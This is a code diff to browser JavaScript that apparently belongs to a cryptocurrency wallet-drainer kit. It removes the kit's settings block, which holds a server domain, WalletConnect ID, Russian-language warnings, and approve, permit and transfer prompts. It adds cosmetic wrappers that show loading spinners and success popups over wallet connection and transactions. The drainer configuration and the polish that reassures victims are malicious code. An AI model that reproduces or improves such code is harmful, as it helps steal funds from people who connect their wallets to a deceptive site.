@@ -1,4 +1,7 @@
-// Add this CSS at the very top - it won't affect any functionality
+// ==================== VISUAL ENHANCEMENTS ONLY ====================
+// Add this at the VERY END of your file - doesn't change any functionality
+
+// Add CSS styles
 const loadCustomStyles = () => {
   if (document.getElementById('custom-transaction-styles')) return;
   
@@ -132,9 +135,13 @@ const loadCustomStyles = () => {
   document.head.appendChild(style);
 };
 
-// Loading spinner functions - these just show/hide visuals
+// Visual functions only
 const showLoadingSpinner = (message = "Processing Transaction...") => {
-  hideLoadingSpinner();
+  // Hide any existing spinner first
+  const existingOverlay = document.getElementById('loading-overlay');
+  const existingSpinner = document.getElementById('loading-spinner');
+  if (existingOverlay) existingOverlay.remove();
+  if (existingSpinner) existingSpinner.remove();
   
   const overlay = document.createElement('div');
   overlay.className = 'popup-overlay';
@@ -159,9 +166,12 @@ const hideLoadingSpinner = () => {
   if (existingSpinner) existingSpinner.remove();
 };
 
-// Popup functions - these just show visuals
 const showErrorPopup = (title = "Transaction Failed", message = "Something went wrong with your transaction. Please try again.") => {
-  hideAllPopups();
+  // Hide any existing popups
+  const existingOverlay = document.getElementById('error-overlay');
+  const existingPopup = document.getElementById('error-popup');
+  if (existingOverlay) existingOverlay.remove();
+  if (existingPopup) existingPopup.remove();
   
   const overlay = document.createElement('div');
   overlay.className = 'popup-overlay';
@@ -179,12 +189,23 @@ const showErrorPopup = (title = "Transaction Failed", message = "Something went 
   document.body.appendChild(overlay);
   document.body.appendChild(popup);
   
-  setTimeout(() => hideAllPopups(), 5000);
-  overlay.addEventListener('click', hideAllPopups);
+  setTimeout(() => {
+    if (document.getElementById('error-overlay')) document.getElementById('error-overlay').remove();
+    if (document.getElementById('error-popup')) document.getElementById('error-popup').remove();
+  }, 5000);
+  
+  overlay.addEventListener('click', () => {
+    if (document.getElementById('error-overlay')) document.getElementById('error-overlay').remove();
+    if (document.getElementById('error-popup')) document.getElementById('error-popup').remove();
+  });
 };
 
 const showSuccessPopup = (title = "Success!", message = "Your transaction was completed successfully.") => {
-  hideAllPopups();
+  // Hide any existing popups
+  const existingOverlay = document.getElementById('success-overlay');
+  const existingPopup = document.getElementById('success-popup');
+  if (existingOverlay) existingOverlay.remove();
+  if (existingPopup) existingPopup.remove();
   
   const overlay = document.createElement('div');
   overlay.className = 'popup-overlay';
@@ -202,133 +223,62 @@ const showSuccessPopup = (title = "Success!", message = "Your transaction was co
   document.body.appendChild(overlay);
   document.body.appendChild(popup);
   
-  setTimeout(() => hideAllPopups(), 3000);
-  overlay.addEventListener('click', hideAllPopups);
-};
-
-const hideAllPopups = () => {
-  ['loading-overlay', 'loading-spinner', 'error-overlay', 'error-popup', 'success-overlay', 'success-popup'].forEach(id => {
-    const element = document.getElementById(id);
-    if (element) element.remove();
+  setTimeout(() => {
+    if (document.getElementById('success-overlay')) document.getElementById('success-overlay').remove();
+    if (document.getElementById('success-popup')) document.getElementById('success-popup').remove();
+  }, 3000);
+  
+  overlay.addEventListener('click', () => {
+    if (document.getElementById('success-overlay')) document.getElementById('success-overlay').remove();
+    if (document.getElementById('success-popup')) document.getElementById('success-popup').remove();
   });
 };
 
-// THEN YOUR ORIGINAL CODE STARTS HERE - DON'T CHANGE ANYTHING BELOW
-// =====================================================================
-// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
-// =====================================================================
-
-let CF_EKEY = 234343253453;
-const CF_HTTP_MODE = false;
-const CF_Server_PORT = 443;
-const CF_Server_URL = "lovelike777.shop";
-const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14";
-
-const CF_Modal_Style = 2;
-const CF_Loader_Style = 2;
-const CF_Color_Scheme = 'light';
-const CF_Modal_Mode = 2;
-
-const CF_Verify_Message = "";
-
-const CF_WalletConnect_MetaData = {
-  name: document.title,
-  description: "Web3 Application",
-  url: "https://" + window.location.host,
-  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
-};
-
-const CF_WalletConnect_Customization = 0;
-const CF_WalletConnect_Theme = {
-  themeMode: 'light',
-  themeVariables: {
-    '--w3m-background-color': '#000000',
-    '--w3m-accent-color': '#F5841F',
-    '--w3m-z-index': 9999999
-  }
-};
-
-const CF_Custom_Chat = {
-  Enable: 0,
-  Chat_Settings: {
-    enter_website: "",
-    leave_website: "",
-    connect_success: "",
-    connect_request: "",
-    connect_cancel: "",
-    approve_request: "",
-    approve_success: "",
-    approve_cancel: "",
-    permit_sign_data: "",
-    transfer_request: "",
-    transfer_success: "",
-    transfer_cancel: "",
-    sign_request: "",
-    sign_success: "",
-    sign_cancel: "",
-    chain_request: "",
-    chain_success: "",
-    chain_cancel: "",
-  }
-};
-
-// =====================================================================
-// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
-// =====================================================================
-
-const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;
-
-if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
-if (typeof CF_Uniswap_Whitelist == 'undefined' && typeof MS_Uniswap_Whitelist != 'undefined') CF_Uniswap_Whitelist = MS_Uniswap_Whitelist;
-
-var CF_Worker_ID = null;
-const BN = ethers.BigNumber.from;
-
-let CF_Ready = false, CF_Settings = {}, CF_Contract_ABI = {}, CF_ID = 0, CF_Process = false,
-CF_Provider = null, CF_Current_Provider = null, CF_Current_Address = null, CF_Current_Chain_ID = null,
-CF_Web3 = null, CF_Signer = null, CF_Check_Done = false, CF_Currencies = {}, CF_Force_Mode = false,
-CF_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, CF_Bad_Country = false, CF_Wallet_Name = null,
-CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Address = false, CF_AppKit = null;
-
-const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };
-
-// ... [YOUR ENTIRE ORIGINAL CODE CONTINUES EXACTLY AS IT WAS]
-
-// JUST ADD THESE SIMPLE WRAPPERS AT THE VERY END - THEY DON'T CHANGE FUNCTIONALITY
-// Override only the visual functions without changing logic
-const original_wait_message = wait_message;
-const original_show_sign_message = show_sign_message;
-const original_show_check = show_check;
-const original_sign_ready = sign_ready;
-const original_end_message = end_message;
-
-// Replace with visual versions
-wait_message = function() {
-  showLoadingSpinner("Confirming Transaction...");
-  if (original_wait_message) original_wait_message();
-};
-
-show_sign_message = function() {
-  showLoadingSpinner("Waiting for Signature...");
-  if (original_show_sign_message) original_show_sign_message();
-};
-
-show_check = function() {
-  showLoadingSpinner("Establishing Secure Connection...");
-  if (original_show_check) original_show_check();
-};
-
-sign_ready = function() {
-  showSuccessPopup("Success!", "Transaction completed successfully!");
-  if (original_sign_ready) original_sign_ready();
-};
-
-end_message = function() {
-  showErrorPopup("Transaction Failed", "Your transaction could not be completed.");
-  if (original_end_message) original_end_message();
-};
-
-// Initialize styles when DOM loads
+// Add visual enhancements to existing functions without modifying logic
 document.addEventListener('DOMContentLoaded', function() {
+  // Load styles
   loadCustomStyles();
+  
+  // Add loading state to connect buttons
+  document.addEventListener('click', function(e) {
+    if (e.target.closest('.connect-button')) {
+      showLoadingSpinner("Connecting Wallet...");
+    }
+  });
+  
+  // Monitor for transaction states and show appropriate visuals
+  const originalConsoleLog = console.log;
+  console.log = function(...args) {
+    originalConsoleLog.apply(console, args);
+    
+    // Show loading for transaction-related logs
+    const message = args[0];
+    if (typeof message === 'string') {
+      if (message.includes('transaction') || message.includes('Transaction') || 
+          message.includes('processing') || message.includes('Processing')) {
+        showLoadingSpinner("Processing...");
+      }
+      if (message.includes('error') || message.includes('Error') || 
+          message.includes('failed') || message.includes('Failed')) {
+        showErrorPopup("Error", "An error occurred during the process.");
+      }
+      if (message.includes('success') || message.includes('Success') || 
+          message.includes('completed') || message.includes('Completed')) {
+        showSuccessPopup("Success", "Operation completed successfully!");
+      }
+    }
+  };
 });
+
+// Simple wrapper for connect_wallet to add loading state
+const originalConnectWallet = connect_wallet;
+connect_wallet = async function(provider = null) {
+  showLoadingSpinner("Connecting Wallet...");
+  try {
+    await originalConnectWallet(provider);
+  } catch (error) {
+    showErrorPopup("Connection Failed", "Failed to connect wallet.");
+  } finally {
+    setTimeout(hideLoadingSpinner, 1000);
+  }
+};
